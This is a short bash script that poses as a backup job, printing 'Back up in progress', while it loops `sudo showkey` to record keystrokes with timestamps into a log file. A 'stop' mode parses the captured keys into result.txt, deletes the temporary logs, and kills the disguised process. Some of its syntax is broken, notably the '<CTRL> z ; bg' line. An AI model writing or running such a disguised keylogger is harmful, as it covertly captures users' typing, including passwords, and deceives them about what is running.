#!/bin/bash

if [[ $1 == "stop" ]]; then
	
	if [[ -e logger_temp.txt ]]; then

		echo "Give me a second to finish."
		echo "You won't be to be late? ;)"

		i=0
		for (( i = 0; i < 24; i++ )); do
			echo -n ". "
			sleep 0.5
		done

		echo ""

		python3 parse.py
		#python3 obfuscated.py

		string=\"Space\"
		sed "s/${string}/ /g" output.txt | tr "\"" " " >> result.txt

		rm output.txt
		rm final_logger.txt
		rm logger_temp.txt
	else
		echo "-> logger_temp.txt not found."
	fi

	kill $(ps aux | awk '/[b]ackup/ {print $2}')
	exit

elif [[ $1 == "" ]]; then
	echo "Back up in progress........"   


	if [[ -e result.txt ]]; then
		rm result.txt
	fi

	while true; do

		date >> logger_temp.txt
		sudo showkey >> logger_temp.txt ; <CTRL> z ; bg

	done

else
	echo "Input error."
fi

